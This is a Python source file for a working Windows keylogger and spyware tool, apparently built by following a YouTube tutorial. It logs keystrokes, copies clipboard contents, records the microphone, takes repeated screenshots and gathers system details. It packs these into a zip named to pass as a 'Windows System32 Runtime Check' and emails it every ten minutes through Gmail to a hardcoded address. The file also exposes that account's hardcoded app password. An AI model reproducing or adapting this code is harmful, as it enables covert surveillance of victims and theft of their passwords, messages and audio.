# Vid used https://www.youtube.com/watch?v=25um032xgrw
# Link for the email thing in the description, but he also does it in the vid. Slightly different : https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/?ref=rp

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# My own Imports
from threading import Timer
from datetime import datetime
# Useful quick vid for the threading Timer https://www.youtube.com/watch?v=6Ll9PuCi92c&t=31s 
from zipfile import ZipFile
from pathlib import Path

keys_info = 'text.txt'
email_address = 'itaumeh003@gmail.com'
password = 'sfntevumiqnyhyho'
#### Here make sure you use the app password for the email, which you can activate after 2 factor authentication and not the actual password for the email. 
toaddr = 'itaumeh003@gmail.com'
system_info = 'sysinfo.txt'
clipboard_info = 'clipboard.txt'
microphone_time = 8
screenshot_counter = 1
audio_counter = 1

# file_path = 'C:\\Users\\Mathew\\Documents\\CyberSecurity\\Python_Projects\\Key_Logger\\Advanced_Key_logger_Vid'
# ^^Remember to add double slashes to each file path \\
extend = '\\'

current_working_dir = os.getcwd()

# You can do a path extend but to late I dont want to change everything. path_extend = current_working_dir + extend 









def computer_info():
    date_time = datetime.today().strftime('%d-%m-%Y %H~%M~%S ')
    with open(current_working_dir + extend + system_info, 'a') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname_ex(hostname)
        ########### instead of IPAddr = socket.gethostbyname(hostname) make sure you use the _ex to print out all ip because the device can have multiple ip's on different interfaces. 
        try:
            public_ip = get('https://api.ipify.org/').text
            f.write('Public IP Address: '+ public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Adress, most likely max query" + '\n')
        
        f.write('Processor: '+ (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Adress: " + str(IPAddr) + '\n')
        f.write(str(date_time))
        f.write('\n')
        f.write('\n')
        print('H1',date_time)
        Timer(7200, computer_info).start()

computer_info()








def copy_clipboard():
    date_time = datetime.today().strftime('%d-%m-%Y %H~%M~%S ')
    with open(current_working_dir + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
            f.write('\n')
            f.write(str(date_time))
            f.write('\n')
            f.write('\n')
            print('H2',date_time)

        except:
            f.write("Clipboard could not be copied")
            f.write('\n')
    Timer(90, copy_clipboard).start()

copy_clipboard()











def microphone():
    global audio_counter
    audio_info = 'audio' + str(audio_counter) + '.wav'
    fs = 44100
    seconds = microphone_time
    print('mic on')
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(current_working_dir + extend + audio_info, fs, myrecording)
    audio_counter = audio_counter + 1  
    Timer(160, microphone).start()
    
microphone()













def screenshot():
    global screenshot_counter
    screenshot_info = 'screenshot'+ str(screenshot_counter) +'.png'
    date_time = datetime.today().strftime('%Y-%m-%d %H:%M:%S')
    img = ImageGrab.grab()
    img.save(current_working_dir + extend + screenshot_info)
    screenshot_counter = screenshot_counter + 1
    print('H3',date_time,screenshot_counter)
    Timer(45, screenshot).start()
    
screenshot()







# Deleting unnecessary files, getting image file paths, clearing all text files.

def clean_up_files():
    # img_file_path_list = []
    files = os.listdir(current_working_dir)

    print('clean up running...')

    for file in files:
        if file.endswith(('.png','.wav')):
            os.remove(file)
        elif file.endswith('.txt'):
            with open(current_working_dir + extend + file, 'w') as f:
                f.write(" ")
                f.close()
        else:
            print('error not correct files type')

    







# Zipping all the files in the current working directory.

def get_all_file_paths(directory):

 # initializing empty file paths list
 file_paths = []

 # crawling through directory and subdirectories
 for root, directories, files in os.walk(directory):
  for filename in files:
   # join the two strings in order to form the full filepath.
   filepath = os.path.join(root, filename)
   file_paths.append(filepath)

 # returning all file paths
 return file_paths

def main_zip():
    global zip_counter
    date_time = datetime.today().strftime('%d-%m-%Y %H~%M~%S ')
    name = 'Windows System32 Runtime Check ' + " " + date_time + '.zip'

    # calling function to get all file paths in the directory
    file_paths = get_all_file_paths(current_working_dir)

    # printing the list of all files to be zipped
    print('Following files will be zipped in this program:')
    for file_name in file_paths:
        print(file_name)

    # writing files to a zipfile
    with ZipFile(name,'w') as zip:
    # writing each file one by one
        for file in file_paths:
            zip.write(file)
        


    zip_file_path_list = []
    files = os.listdir(current_working_dir)
    for file in files:
        if file.endswith('.zip'):
            zip_file_path = os.path.join(current_working_dir, file)
            zip_file_path_list.append(zip_file_path)
    
    if os.path.getsize(zip_file_path_list[0]) > 26214400:
        print('########################>25MB')
        for file in get_all_file_paths(current_working_dir):
            print('removing 1 wav file...')
            if file.endswith('.wav'):
                time.sleep(1)
                os.remove(file)
                break
            elif file.endswith('.png'):
                print('no more wav files.')
                time.sleep(1)
                os.remove(file)
                break
            else:
                pass
        print('removing zip file.....')
        os.remove(zip_file_path_list[0])
        print('re running.')
        main_zip()
    else:
        print('All wav files deleted or less than 25 MB')

    print('All files zipped successfully!')
    clean_up_files()
    # Timer(584, main_zip).start()




# To get the zip file path.
def get_zip_file():
    zip_file_path_list = []
    zip_file_name_list = []
    files = os.listdir(current_working_dir)

    for file in files:
        if file.endswith('.zip'):
            zip_file_path = os.path.join(current_working_dir, file)
            zip_file_path_list.append(zip_file_path)
            zip_file_name_list.append(file)

    return [zip_file_path_list, zip_file_name_list]
 
     
















# To send email
email_counter = 1

def send_email(filename, attachment, toaddr):
    global email_counter
    fromaddr = email_address
    date_time = datetime.today().strftime('%Y-%m-%d %H:%M:%S')

    if email_counter == 1 :
        email_num = '**First** '
        email_counter = email_counter + 1
    else:
        email_num = ' '    
    
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File " + str(email_num) + str(date_time)

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
  
    # sending the mail
    s.sendmail(fromaddr, toaddr, text)
    print('H5 Email Sent')
    # terminating the session
    s.quit()

# Basically all on here for the emial https://www.geeksforgeeks.org/send-mail-attachment-gmail-account-using-python/?ref=rp 

# send_email( zip_file_path[1][0], zip_file_path[0][0] , toaddr)
                # name                  file path zip

def email_del_zip():
    main_zip()
    time.sleep(1.5)
    print('Emailing')
    try:
        zip_file_path = get_zip_file()
        send_email( zip_file_path[1][0], zip_file_path[0][0] , toaddr)
        print('Done sending email')
        os.remove(zip_file_path[1][0])
    except Exception:
        print('Email error')
        pass
    Timer(600, email_del_zip).start()

email_del_zip()

############## here when selecting items in the list, the first [] selects the item in the list so first the 0 item for the file path and then the 1 st item for the file name. I think there might be another way to do this but in stack overflow, with like [0],0. So like a comma instead of double brackets for the second one. 

############# The email section no longer works due to a smtp gmail update thing on less secure apps on the 30 may 2022. https://stackoverflow.com/questions/16512592/login-credentials-not-working-with-gmail-smtp?answertab=modifieddesc#tab-top when you get you indo card back, set up 2 factory authentication for the itaumhe003@gmail.com account then turn on get an app password, and use that instead of the original password. This is outlined in the post, sort the posts from newest first. A post also links to this article which explains it https://levelup.gitconnected.com/an-alternative-way-to-send-emails-in-python-5630a7efbe84 




count = 0
keys = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
    
def write_file(keys):
    with open(current_working_dir + extend + keys_info, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if 'Key.space' in k:
                f.write('\n')
                # f.close()
            if 'Key.backspace' in k:
                f.write('(#bs)')
                # f.close()
            elif k.find("Key") == -1:
                f.write(str(k))
                # f.close()
# Apparently You dont need to f.close()

def on_release(key):
    if key == Key.end:
        exit()
        # return False
        

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()









# There is an encryption feature but I didn't bother because it encrypts the text files but i want to read the on my phone without having to decrypt from a computer first. 